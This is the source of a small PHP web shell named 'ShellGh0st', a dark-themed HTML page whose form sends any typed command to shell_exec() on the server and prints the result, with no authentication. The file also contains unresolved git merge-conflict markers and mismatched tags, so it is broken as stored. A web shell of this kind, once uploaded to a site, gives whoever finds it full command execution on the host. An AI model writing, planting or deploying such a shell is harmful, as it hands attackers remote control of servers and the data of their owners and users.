<!DOCTYPE html>
<html>
<head>
	<title>Shell by C0deGh0st</title>
</head>


<style type="text/css">

body{
	background-color: black;
}
.header{
	color: #1fbf00;
}

.ResultCommand{
	width: 959px;
	min-height: 400px;
	border-style: solid;
	border-width: 1px;
    border-color: #21cd00;
    color: #29ff00;
    margin-bottom: 30px;
}

.InputCommand{
	margin-bottom: 50px;
}

.InputCommand input{
	background-color: black;
	border-style: dotted;
	border-color: #21cd00;
	color:white;
	height: 30px;
}

.InputCommand label{
	color: #1fbf00;
	text-shadow: -5px -5px 5px #1fbf00;
	font-size: 15pt;
}


</style>

<body>
	<div id="container">
		<di class="header">
			<h1>ShellGh0st</h1>
		</dir>
		<div class="ResultCommand">
<<<<<<< HEAD
=======
		<table>
			<tr>
			<td>
>>>>>>> 22fc62e631f214a22a916abfffb5e335d5baaf67
			<?php
				$cmd = $_POST['command'];
				if(!empty($cmd)){
					echo "<pre>";
					echo shell_exec($cmd);
					echo "</pre>";
				}
			?>
<<<<<<< HEAD
=======
			</td>
			</tr>
		</table>
>>>>>>> 22fc62e631f214a22a916abfffb5e335d5baaf67
		</div>

		<div class="InputCommand">
			<form action="<?php echo htmlentities($_SERVER['PHP_SELF']);?>" method="POST">
				<label>Enter Command:</label>
				<input type="text" name="command" size="100">
			</form>
		</div>
	</div>

</body>
</html>